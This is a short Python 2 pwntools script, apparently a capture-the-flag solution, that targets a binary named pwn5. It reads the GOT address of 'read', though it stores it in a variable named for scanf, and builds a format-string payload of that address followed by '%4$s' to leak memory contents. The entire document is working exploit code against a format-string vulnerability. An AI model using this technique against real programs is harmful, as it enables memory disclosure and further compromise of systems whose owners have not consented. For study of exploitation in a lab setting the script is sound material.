#!  /usr/bin/env python
from pwn import *
leakmemory = ELF('./pwn5')
__isoc99_scanf_got = leakmemory.got['read']
print hex(__isoc99_scanf_got)
payload = p32(__isoc99_scanf_got) + '%4$s'
print payload
